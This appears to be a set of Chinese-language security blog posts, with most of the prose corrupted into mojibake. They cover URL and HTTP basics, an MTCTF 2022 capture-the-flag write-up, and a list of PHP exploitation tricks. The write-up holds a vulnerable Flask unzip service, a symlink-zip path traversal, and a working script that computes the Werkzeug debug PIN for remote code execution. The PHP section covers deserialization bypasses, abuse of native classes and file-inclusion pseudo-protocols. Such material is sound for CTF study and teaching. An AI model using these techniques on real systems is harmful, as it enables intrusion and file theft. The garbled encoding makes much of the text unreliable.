]@]ä¸»æœº[:ç«¯å£]][/è·¯å¾„][?é˜Ÿåˆ—][#ç‰‡æ®µ]\n```\n\nä¸‹é¢æˆ‘ä»¬ä»¥ä¸€ä¸ªhttpåè®®çš„urlæ¥å¯¹ä¸Šé¢çš„å†…å®¹åšä¸€ä¸ªè§£é‡Š\n\n```\nhttp://jlan.darkflow.top/posts/58958.html\n```\n\næˆ‘ä»¬æ¥æŒ‰ç…§ä¸Šé¢çš„è¯­æ³•æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªæ˜¯ä»€ä¹ˆå†…å®¹\n\né¦–å…ˆæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯httpåè®®æ¥å¯¹jlan.darkflow.topè¿™ä¸ªæœåŠ¡ä¸»æœºè¿›è¡Œè®¿é—®ï¼Œè®¿é—®çš„æ˜¯/posts/58958.htmlè¿™ä¸ªç½‘é¡µèµ„æºï¼Œè¿™æ—¶å€™åº”è¯¥å°±ä¼šæœ‰äººé—®äº†ï¼Œä¸ºä»€ä¹ˆè¿™ä¸ªhttpçš„URLé‡Œé¢æ²¡æœ‰ç”¨æˆ·å•Šå¯†ç å•Šç«¯å£ä¹‹ç±»çš„ä¸œè¥¿å‘¢ï¼Œå¾ˆç®€å•ï¼Œå› ä¸ºè¿™äº›å†…å®¹éƒ½æ˜¯å¯é€‰é¡¹ï¼Œè€Œhttpåè®®å†…å®¹åŸºæœ¬éƒ½æ˜¯å…¬å¼€è®¿é—®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦æŒ‡æ˜æˆ‘ä»¬ç”¨æˆ·çš„èº«ä»½ï¼Œå¹¶ä¸”httpåè®®çš„é»˜è®¤ç«¯å£æ˜¯80ç«¯å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è®¿é—®è¿™ä¸ªURLçš„æ—¶å€™ä¼šè‡ªåŠ¨çš„å»80ç«¯å£å¯»æ‰¾èµ„æº\n\né‚£å¦‚æœæˆ‘ä»¬æ²¡æœ‰æŠŠhttpæœåŠ¡æ”¾åœ¨80ç«¯å£è€Œæ˜¯æ”¾åœ¨å…¶ä»–ç«¯å£å‘¢ï¼Œæ¥åšä¸ªå®éªŒï¼Œæˆ‘ä»¬ç”¨flaskèµ·ä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œä½¿ç”¨80ç«¯å£ä½œä¸ºhttpæœåŠ¡çš„ç«¯å£![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262243049.png)\n\næˆ‘ä»¬æ¥ç›´æ¥è®¿é—®çœ‹çœ‹ï¼Œè™½ç„¶æˆ‘ä»¬æ²¡æœ‰åœ¨URLä¸­æ·»åŠ ç«¯å£ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹ŸæˆåŠŸè®¿é—®åˆ°äº†æˆ‘ä»¬çš„webç«™ç‚¹ï¼Œæ·»åŠ äº†80ç«¯å£ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”ç”±äºæµè§ˆå™¨çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬åœ¨æ·»åŠ 80ç«¯å£åˆ°URLä¸­æ—¶é»˜è®¤æ˜¯ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥çš„\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262245054.png)\n\nä¸‹ä¸€æ­¥å°±æ˜¯å°†é»˜è®¤ç«¯å£è¿›è¡Œæ›´æ”¹ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨ä»£ç ä¸­å°†ç«¯å£æ›´æ”¹ä¸ºäº†10010ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å†æ¥ç›´æ¥è®¿é—®çœ‹çœ‹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262243232.png)\n\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç°åœ¨ç”¨é»˜è®¤çš„80ç«¯å£å·²ç»è¡Œä¸é€šäº†ï¼Œé‚£æˆ‘ä»¬å°±åŠ ä¸Šæˆ‘ä»¬è‡ªå®šä¹‰çš„ç«¯å£å·å†æ¥è®¿é—®\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262248667.png)\n\nå¯ä»¥çœ‹åˆ°è®¿é—®æˆåŠŸï¼Œå¹¶ä¸”åœ¨åœ°å€æ ä¹Ÿå‡ºç°äº†æˆ‘ä»¬è¾“å…¥çš„è‡ªå®šä¹‰ç«¯å£å·\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262251416.png)\n\né‚£ä¸‹ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸€ä¸ªftpåè®®çš„URL\n\n```\nftp://jlan@127.0.0.1/xxx/flag\n```\n\nè¿™ä¸ªå°±å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬ä»¥Jlançš„èº«ä»½åœ¨127.0.0.1æœåŠ¡å™¨ä¸Šé¢æ‹¿ä¸€ä»½flagï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹Ÿæ²¡æœ‰æŒ‡å®šç«¯å£ï¼Œå› ä¸ºftpåè®®ä¹Ÿæ˜¯æœ‰é»˜è®¤ç«¯å£çš„ï¼Œå…¶å®å‡ ä¹æ‰€æœ‰åè®®éƒ½ä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„ç«¯å£å·ï¼Œåœ¨ä¸€äº›ä½¿ç”¨è¿™äº›åè®®çš„ç¨‹åºä¸­å¤§éƒ¨åˆ†æƒ…å†µæˆ‘ä»¬éƒ½ä¸éœ€è¦å†é¢å¤–æ·»åŠ ç«¯å£\n\n# HTTP\n\nè¯´å®Œäº†URLæˆ‘ä»¬æ¥è¯´å¦ä¸€ä¸ªwebçš„åŸºç¡€çŸ¥è¯†å°±æ˜¯HTTPåè®®ï¼ŒåŒæ ·å…ˆç™¾åº¦\n\n> HTTPåè®®æ˜¯Hyper Text Transfer Protocolï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰çš„ç¼©å†™,æ˜¯ç”¨äºä»ä¸‡ç»´ç½‘ï¼ˆWWW:World Wide Web ï¼‰æœåŠ¡å™¨ä¼ è¾“è¶…æ–‡æœ¬åˆ°æœ¬åœ°æµè§ˆå™¨çš„ä¼ é€åè®®ã€‚\n>\n> HTTPæ˜¯ä¸€ä¸ªåŸºäºTCP/IPé€šä¿¡åè®®æ¥ä¼ é€’æ•°æ®ï¼ˆHTML æ–‡ä»¶, å›¾ç‰‡æ–‡ä»¶, æŸ¥è¯¢ç»“æœç­‰ï¼‰ã€‚\n>\n> HTTPæ˜¯ä¸€ä¸ªå±äºåº”ç”¨å±‚çš„é¢å‘å¯¹è±¡çš„åè®®ï¼Œç”±äºå…¶ç®€æ·ã€å¿«é€Ÿçš„æ–¹å¼ï¼Œé€‚ç”¨äºåˆ†å¸ƒå¼è¶…åª’ä½“ä¿¡æ¯ç³»ç»Ÿã€‚å®ƒäº1990å¹´æå‡ºï¼Œç»è¿‡å‡ å¹´çš„ä½¿ç”¨ä¸å‘å±•ï¼Œå¾—åˆ°ä¸æ–­åœ°å®Œå–„å’Œæ‰©å±•ã€‚ç›®å‰åœ¨WWWä¸­ä½¿ç”¨çš„æ˜¯HTTP/1.0çš„ç¬¬å…­ç‰ˆï¼ŒHTTP/1.1çš„è§„èŒƒåŒ–å·¥ä½œæ­£åœ¨è¿›è¡Œä¹‹ä¸­ï¼Œè€Œä¸”HTTP-NG(Next Generation of HTTP)çš„å»ºè®®å·²ç»æå‡ºã€‚\n>\n> HTTPåè®®å·¥ä½œäºå®¢æˆ·ç«¯-æœåŠ¡ç«¯æ¶æ„ä¸ºä¸Šã€‚æµè§ˆå™¨ä½œä¸ºHTTPå®¢æˆ·ç«¯é€šè¿‡URLå‘HTTPæœåŠ¡ç«¯å³WEBæœåŠ¡å™¨å‘é€æ‰€æœ‰è¯·æ±‚ã€‚WebæœåŠ¡å™¨æ ¹æ®æ¥æ”¶åˆ°çš„è¯·æ±‚åï¼Œå‘å®¢æˆ·ç«¯å‘é€å“åº”ä¿¡æ¯ã€‚\n\n![img](https://upload-images.jianshu.io/upload_images/2964446-fdfb1a8fce8de946.png?imageMogr2/auto-orient/strip%7CimageView2/2)\n\nä¸Šé¢è¿™å¼ å›¾å°±å¾ˆå¥½çš„è¯´æ˜äº†HTTPåè®®å®šä¹‰çš„å†…å®¹\n\nå•Šåæ­£HTTPåè®®å°±æ˜¯ä¸€ç§ä¼ è¾“ç½‘é¡µå†…å®¹çš„åè®®ï¼Œåè®®å°±æ˜¯åŒæ–¹å®šä¹‰äº†ä¸€ç§æ•°æ®äº¤æ¢çš„æ–¹å¼ï¼ŒæŒ‰ç…§è§„å®šçš„æ ¼å¼æ¥ä¼ è¾“æ•°æ®ï¼Œwebæ‰‹æ‰€è°“çš„â€œæŠ“åŒ…â€å°±æ˜¯å¯¹HTTPçš„æ•°æ®åŒ…è¿›è¡Œæ‹¦æˆªï¼Œç„¶åå–å‡ºå…¶ä¸­çš„åŸå§‹æ•°æ®ï¼Œå¤šè¯´æ— ç›Šï¼Œæˆ‘ä»¬æ¥å®é™…æŠ“åŒ…å°è¯•ä¸€ä¸‹ï¼Œè¿˜æ˜¯ä½¿ç”¨åˆšæ‰çš„webæœåŠ¡å™¨\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262325345.png)\n\nçœ‹è¿™é‡Œå°±æ˜¯ä¸€æ•´ä¸ªå®Œæ•´çš„è¯·æ±‚å’Œå“åº”å†…å®¹äº†ï¼Œç¬¬ä¸€è¡Œæ˜¯è¯·æ±‚çš„æ–¹æ³•å’Œåè®®ï¼Œåé¢æ¯è¡Œéƒ½æ˜¯ä¸€ä¸ªè¯·æ±‚æ ‡å¤´ï¼Œæœ€åæœ‰ä¸€ä¸ªå›è½¦å’Œæ¢è¡Œç»“æŸï¼Œè¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„GETè¯·æ±‚ï¼Œé‚£POSTç±»å‹çš„è¯·æ±‚æ˜¯ä»€ä¹ˆæ ·å­çš„å‘¢ï¼Œæˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262335979.png)\n\nå‘ç°è¯·æ±‚çš„æœ€ä¸‹é¢æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹ï¼Œå¹¶ä¸”åˆå¤šäº†ä¸€ä¸ªå«åšContent-Lengthçš„è¯·æ±‚å¤´ï¼Œè¿™ä¸ªè¯·æ±‚å¤´å°±æ˜¯å‘Šè¯‰æœåŠ¡å™¨ï¼Œæˆ‘ä»¬åœ¨æœ€åä¸€ä¸ªæ¢è¡Œä¹‹åè¿˜æœ‰9å­—èŠ‚çš„å†…å®¹éœ€è¦ä¼ è¾“ï¼Œæˆ‘ä»¬è¯•è¯•åœ¨æœåŠ¡å™¨ä¸­å°†å†…å®¹å–å‡ºå¹¶ä¸”å›æ˜¾ï¼Œé‚£å¦‚æœæˆ‘ä»¬ä¿®æ”¹è¿™ä¸ªè¯·æ±‚å¤´è®©å®ƒæ¯”æˆ‘ä»¬å®é™…çš„è¯·æ±‚çŸ­ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209262336473.png)\n\nå¯ä»¥çœ‹åˆ°æœåŠ¡å™¨æŒ‰ç…§æˆ‘ä»¬çš„è¯·æ±‚å¤´å£°æ˜çš„ä¸€æ ·ï¼Œåªå–äº†å‰8ä½çš„å†…å®¹ï¼Œè¿”å›äº†jla\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"MTCTF 2022","url":"/posts/94d6ea88.html","content":"\n## babyjava\n\nç›´æ¥æœXpathæ³¨å…¥å·¥å…·\n\nhttps://www.zhihuifly.com/t/topic/370\n\næŒ‰ç…§å¯¹åº”çš„URLä¸postä¼ å‚\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171837552.png)\n\næŒ‰è¯´æ˜ä¸€å±‚å±‚çˆ†å‡ºç»“æœï¼Œæœ€ç»ˆæ–‡æ¡£æ ‘å¦‚ä¸‹\n\n```\nroot\n\tuser\n\t\tusernameï¼ˆflagåœ¨é‡Œé¢ï¼‰\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171843715.png)\n\n```\nflag{273f7d50-2f92-47ba-b5d4-358ae3add895}\n```\n\n## OnlineUnzip\n\næºç \n\n```python\nimport os\nimport re\nfrom hashlib import md5\nfrom flask import Flask, redirect, request, render_template, url_for, make_response\n\napp=Flask(__name__)\n\ndef extractFile(filepath):\n    extractdir=filepath.split('.')[0]\n    if not os.path.exists(extractdir):\n        os.makedirs(extractdir)\n    os.system(f'unzip -o {filepath} -d {extractdir}')\n    return redirect(url_for('display',extractdir=extractdir))\n\n@app.route('/', methods=['GET'])\ndef index():\n    return render_template('index.html')\n\n@app.route('/display', methods=['GET'])\n@app.route('/display/', methods=['GET'])\n@app.route('/display/<path:extractdir>', methods=['GET'])\ndef display(extractdir=''):\n    if re.search(r\"\\.\\.\", extractdir, re.M | re.I) != None:\n        return \"Hacker?\"\n    else:\n        if not os.path.exists(extractdir):\n            return make_response(\"error\", 404)\n        else:\n            if not os.path.isdir(extractdir):\n                f = open(extractdir, 'rb')\n                response = make_response(f.read())\n                response.headers['Content-Type'] = 'application/octet-stream'\n                return response\n            else:\n                fn = os.listdir(extractdir)\n                fn = [\"..\"] + fn\n                f = open(\"templates/template.html\")\n                x = f.read()\n                f.close()\n                ret = \"<h1>æ–‡ä»¶åˆ—è¡¨:</h1><br><hr>\"\n                for i in fn:\n                    tpath = os.path.join('/display', extractdir, i)\n                    ret += \"<a href='\" + tpath + \"'>\" + i + \"</a><br>\"\n                x = x.replace(\"HTMLTEXT\", ret)\n                return x\n\n\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload():\n    ip = request.remote_addr\n    uploadpath = 'uploads/' + md5(ip.encode()).hexdigest()[0:4]\n\n    if not os.path.exists(uploadpath):\n        os.makedirs(uploadpath)\n\n    if request.method == 'GET':\n        return redirect('/')\n\n    if request.method == 'POST':\n        try:\n            upFile = request.files['file']\n            print(upFile.filename)\n            if os.path.splitext(upFile.filename)[-1]=='.zip':\n                filepath=f\"{uploadpath}/{md5(upFile.filename.encode()).hexdigest()[0:4]}.zip\"\n                upFile.save(filepath)\n                zipDatas = extractFile(filepath)\n                return zipDatas\n            else:\n                return f\"{upFile.filename} is not a zip file !\"\n        except:\n            return make_response(\"error\", 404)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000, debug=True)\n```\n\næ€»ç»“å°±æ˜¯ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶é‡å‘½åè§£å‹ï¼Œå¹¶ä¸”åœ¨è®¿é—®æ–‡ä»¶æ—¶é€šè¿‡`../`æ¥æ‰§è¡Œç›®å½•ç©¿è¶Šï¼Œæ²¡å…³ç³»æˆ‘ä»¬ç›´æ¥ç”¨è½¯è¿æ¥![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171847624.png)\n\nå¯ä»¥çœ‹åˆ°xæ—¶ä¸€ä¸ªæŒ‡å‘æ ¹ç›®å½•çš„è½¯è¿æ¥ï¼Œå‹ç¼©ï¼Œä¸Šä¼ ï¼Œè®¿é—®ï¼Œç›®å½•ç©¿è¶Šå¯ä»¥è¿›è¡Œä»»æ„çš„æ–‡ä»¶è¯»å–äº†\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171847477.png)ä½†æ˜¯è¿™æ—¶å€™æˆ‘ä»¬ç›´æ¥ç‚¹å‡»flagå‘ç°æ— æ³•è¯»å–å¹¶ä¸”æŠ¥é”™ï¼Œå¯èƒ½æ²¡æœ‰æƒé™å¹¶ä¸”debugæ¨¡å¼æ˜¯å¼€å¯çš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è€ƒè™‘é€šè¿‡è®¡ç®—PINå€¼æ‰“å¼€consoleæ¥RCE![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171849327.png)\n\næ‰€éœ€çš„æ–‡ä»¶å¦‚ä¸‹ï¼š\n\n> /sys/class/net/eth0/address\n>\n> /etc/machine-id \n>\n> /proc/sys/kernel/random/boot_id #æœ¬é¢˜ç¯å¢ƒå­˜åœ¨machine-idæ‰€ä»¥ä¸éœ€è¦boot_idäº†\n>\n> /proc/self/cgroup\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171857744.png)\n\nä½¿ç”¨è„šæœ¬æ¥è®¡ç®—PINå€¼\n\n```python\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'ctf'# /etc/passwd\n    'flask.app',# é»˜è®¤å€¼\n    'Flask',# é»˜è®¤å€¼\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # æŠ¥é”™å¾—åˆ°\n]\nprivate_bits = [\n    '95532648517',#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶\n\t\t'96cec10d3d9307792745ec3b85c896207445bfc71ac17f0f2e5d5488c55c3346ea36da9d417b8f57364ddc5081f3f9b1'#  /etc/machine-id+/proc/self/cgroup\n]\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\ncookie_name = '__wzd' + h.hexdigest()[:20]\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\nprint(rv)\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171853259.png)\n\nç›´æ¥è®¿é—®/console RCE\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209171854614.png)\n\n```\nflag{8fd00724-65fe-4c1c-a13d-83b4fc68c8aa}\n```\n\n\n\n\n\n"},{"title":"PHP Trick","url":"/posts/95491106.html","content":"\n# PHP Trick\n\n## ååºåˆ—åŒ–\n\né¦–å…ˆè‚¯å®šè¦æŠŠæ‰€æœ‰çš„é­”æœ¯æ–¹æ³•çœ‹ä¸€çœ‹å•¦\n\n```php\n__construct() \tæ„é€ å‡½æ•°\n__destruct()  \tææ„å‡½æ•°\n__call()\t\t\t\tåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__call() ä¼šè¢«è°ƒç”¨\n__callStatic()\tåœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__callStatic() ä¼šè¢«è°ƒç”¨\n__get()\t\t\t\t\tè¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§çš„å€¼æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨\n__set()\t\t\t\t\tåœ¨ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼æ—¶ï¼Œ__set() ä¼šè¢«è°ƒç”¨\n__isset()\t\t\t\tå½“å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨ isset() æˆ– empty() æ—¶ï¼Œ__isset() ä¼šè¢«è°ƒç”¨\n__unset()\t\t\t\tå½“å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨ unset() æ—¶ï¼Œ__unset() ä¼šè¢«è°ƒç”¨\n__sleep()\t\t\t\tå½“å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æ“ä½œæ—¶ï¼Œä¼šå…ˆè°ƒç”¨__sleep()æ–¹æ³•å†è¿›è¡Œåºåˆ—åŒ–æ“ä½œ\n__wakeup() \t\t\tå½“å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œä¼šå…ˆè°ƒç”¨__wakeup()æ–¹æ³•å†è¿›è¡Œåºåˆ—åŒ–æ“ä½œ\n__serialize()\t\tå’Œ__sleep()æ–¹æ³•ä½œç”¨åŸºæœ¬ç›¸åŒ\n__unserialize() å’Œ__wakeup()æ–¹æ³•ä½œç”¨åŸºæœ¬ç›¸åŒ\n__toString()\t\t__toString()æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ï¼Œåªèƒ½è¿”å›å­—ç¬¦ä¸²ä¸ç„¶ä¼šé£™é”™\n__invoke()\t\t\tå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨\n__set_state()\t\tå½“è°ƒç”¨ var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨\n__clone()\t\t\t\tå¯¹è±¡å¤åˆ¶å¯ä»¥é€šè¿‡ clone å…³é”®å­—æ¥å®Œæˆï¼ˆå¦‚æœå¯èƒ½ï¼Œè¿™å°†è°ƒç”¨å¯¹è±¡çš„ __clone() æ–¹æ³•ï¼‰ã€‚\n__debugInfo()\t\tå½“é€šè¿‡ var_dump() è½¬å‚¨å¯¹è±¡ï¼Œè·å–åº”è¯¥è¦æ˜¾ç¤ºçš„å±æ€§çš„æ—¶å€™ï¼Œ è¯¥å‡½æ•°å°±ä¼šè¢«è°ƒç”¨ã€‚å¦‚æœå¯¹è±¡ä¸­æ²¡æœ‰\tå®šä¹‰è¯¥æ–¹æ³•ï¼Œé‚£ä¹ˆå°†ä¼šå±•ç¤ºæ‰€æœ‰çš„å…¬æœ‰ã€å—ä¿æŠ¤å’Œç§æœ‰çš„å±æ€§ã€‚\n```\n\n### __wakeup()\n\nç»å…¸çš„CVEç»•è¿‡wakeupæ–¹æ³•**CVE-2016-7124**\n\nå½±å“èŒƒå›´ï¼š\n\nPHP5 < 5.6.25\nPHP7 < 7.0.10\n\nåªéœ€è¦æ„é€ å‡ºåºåˆ—åŒ–çš„å­—ç¬¦ä¸²å¹¶å°†å±æ€§æ•°æ”¹ä¸ºå¤§äºçœŸå®å±æ€§æ•°å³å¯\n\n### __destruct()\n\nå¯¹äºphpç‰ˆæœ¬åœ¨8.0ä»¥ä¸‹çš„ï¼Œåªè¦è®©ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¸ä¼šæ‰§è¡Œ`__destruct()`æ–¹æ³•ï¼Œä½†æ˜¯`die`æ–¹æ³•å®æƒ æ­£å¸¸è¿›è¡Œåƒåœ¾å›æ”¶å¹¶è§¦å‘`__destruct()`æ–¹æ³•çš„\n\n### \\__call()ï¼ˆ__callStatic()ï¼‰\n\nå…ˆæ¥çœ‹ä»¥ä¸‹callçš„å®˜æ–¹è¯´æ˜æ ¼å¼\n\n```php\nfunction __call(string $function_name, array $arguments)\n{\n    // æ–¹æ³•ä½“\n}\n```\n\nä¹Ÿå°±æ˜¯è¯´ä½ ä¼ ä¸€ä¸ªå‚æ•°ä¹Ÿå¥½å¤šä¸ªå‚æ•°ä¹Ÿç½¢ï¼Œè¿™äº›å†…å®¹éƒ½ä¼šè¢«ä»¥æ•°ç»„çš„å½¢å¼å­˜å‚¨èµ·æ¥ï¼Œæ‰€ä»¥åœ¨`__call()`æ–¹æ³•ä¸­è°ƒç”¨å‚æ•°å†…å®¹æ—¶ä¸€å®šä¸€å®šè¦æŒ‰ç…§arrayçš„å½¢å¼è°ƒç”¨\n\n### åŸç”Ÿç±»\n\næœ‰æ—¶å€™ååºåˆ—åŒ–ä¼šç¢°åˆ°æ²¡æœ‰ç»™å‡ºè¶³å¤Ÿä½¿ç”¨çš„ç±»çš„æ—¶å€™ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€æŠŠPHPè‡ªå¸¦çš„åŸç”Ÿç±»è¿›è¡Œæ„é€ ï¼ˆä»¥ä¸‹å†…å®¹éƒ½åœ¨PHP7ç¯å¢ƒä¸­è¿›è¡Œæµ‹è¯•ï¼‰\n\n**Exception**\n\n```php\n<?php\n\t\t$a=new Exception(\"1\");\n\t\techo $a;\n\t\t//Exception: 1 in /Users/jlan/PhpstormProjects/untitled/index.php:2 Stack trace: #0 {main}\n?>\n```\n\næˆ‘ä»¬å‘ç°ä¼ å‡ºçš„å†…å®¹ä¸ºï¼š`Exception: ä¼ å…¥çš„å­—ç¬¦ä¸²`å¦‚æœæ­¤æ—¶æ­£å¥½æœ‰`eval`åŒ…è£¹äº†è¯¥ç±»å˜é‡æˆ‘ä»¬å°±èƒ½é€šè¿‡ä¼ å…¥`xx;æ¶æ„ä»£ç ;/*`è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ\n\n**FilesystemIterator**\n\n```php\n<?php\n  \t$a=new FilesystemIterator(\"./\");\n  \techo $a;\n  \t//index.php\n?>\n```\n\nä¼ å…¥ç›®å½•è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ï¼Œ`toString`è¿”å›è¿­ä»£å™¨çš„ç¬¬ä¸€é¡¹ï¼Œå¯ä½¿ç”¨globåè®®è¿›è¡Œé€šé…\n\n**DirectoryIterator**\n\n```php\n<?php\n  \t$a=new DirectoryIterator(\"./\");\n  \techo $a;\n  \t//index.php\n?>\n```\n\nåŒä¸Š\n\n**GlobIterator**\n\n```\n<?php\n$a=new GlobIterator(\"./f*\");\necho $a;\n//flag.txt\n?>\n```\n\nGlobIteratorå’Œä¸Šæ–¹è¿™ä¸¤ä¸ªç±»å·®ä¸å¤šï¼Œä¸è¿‡globæ˜¯GlobIteratorç±»æœ¬èº«è‡ªå¸¦çš„ï¼Œå› æ­¤åœ¨éå†çš„æ—¶å€™ï¼Œå°±ä¸éœ€è¦å¸¦ä¸Šglobåè®®å¤´äº†ï¼Œåªéœ€è¦åé¢çš„ç›¸å…³å†…å®¹\n\n**SplFileObject**\n\n```php\n<?php\n    $a=new SplFileObject(\"./flag.txt\");\n    echo $a;\n\t\t//è¯»å–æ–‡ä»¶é¦–è¡Œå†…å®¹\n?>\n```\n\nSplFileObjectè¿™ä¸ªç±»è¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼Œä½†æ˜¯å¯ä»¥ç”¨ä¼ªåè®®å•Š\n\n**SplFileInfo**\n\n```php\n<?php\n    $a=new SplFileInfo(\"phpinfo();\");\n    echo $a;\n    //phpinfo();\n    eval($a);\n?>\n```\n\nåŸå°ä¸åŠ¨è¿”å›ä¼ å…¥å†…å®¹\n\n**Error**\n\nå’Œ**Exception**å®Œå…¨ä¸€è‡´\n\n## URLè§£æ\n\n## æ–‡ä»¶åŒ…å«\n\nå¾ˆé‡è¦çš„ä¸€å®šæ˜¯å„ç§ä¼ªåè®®äº†\n\n```\nfile://\tç›´æ¥è¯»å–æ–‡ä»¶ï¼Œä¸å—allow_url_fopenå’Œallow_url_includeå½±å“\ndata://[<MIME-type>][;cherset=<encoding>][;base64],<data>\tå¯ä»¥ç›´æ¥å¾€é‡Œé¢æ”¾å†…å®¹\nzip://[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]\tå¯ä»¥ç›´æ¥è¯»å–å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶\nphp://input\tç›´æ¥è¯»å–è¯·æ±‚ä½“çš„æ‰€æœ‰å†…å®¹\nphp://output\tçº¯å†™å…¥ä¸ªäººæ„Ÿè§‰è¿˜æ²¡å•¥å¤§ç”¨\nphp://fd\t\tåŒ…å«æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘çš„æ–‡ä»¶\nphp://memory\tè¯»å†™å†…å­˜çš„ä¸´æ—¶æ–‡ä»¶ï¼Œæ²¡æ„Ÿè§‰æœ‰å•¥åˆ©ç”¨æ–¹æ³•ï¼ˆ\nphp://temp\t\tä¸Šé¢çš„å‡çº§ç‰ˆï¼Œåœ¨ä¸´æ—¶æ–‡ä»¶>2MBæ—¶å°±ä¼šä»å†…å­˜ä¸­æ‹‰å‡ºæ¥å˜æˆåœ¨é»˜è®¤sys_get_temp_dirç›®å½•ä¸‹çš„æ–‡ä»¶\nphp://filter\tæ–‡ä»¶è¯»å–è¿‡æ»¤å™¨\nphar://\tå°±æ˜¯pharå•Šä½ è¿˜æƒ³è¦ä»€ä¹ˆï¼ˆå…¶å®ä¹Ÿå¯ä»¥å’Œzipä¸€æ ·è¯»å–å‹ç¼©åŒ…å†…å®¹ï¼‰\n```\n\n### 